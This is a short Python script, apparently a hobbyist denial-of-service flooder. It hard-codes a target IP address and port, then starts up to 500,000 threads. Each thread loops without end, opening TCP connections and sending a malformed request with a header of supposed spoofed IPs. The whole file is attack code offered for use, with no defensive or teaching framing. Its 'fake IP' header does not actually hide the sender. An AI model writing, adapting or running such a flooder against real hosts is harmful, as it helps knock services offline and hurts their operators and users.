import socket
import threading

target = '128.116.43.186'
fake_ip = '51.15.48.52, 51.158.232.81,   51.158.236.47'
port = 57965

attack_num = 0
def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " UDPRAW/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("IP: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

for i in range(500000):
    thread = threading.Thread(target=attack)
    thread.start()
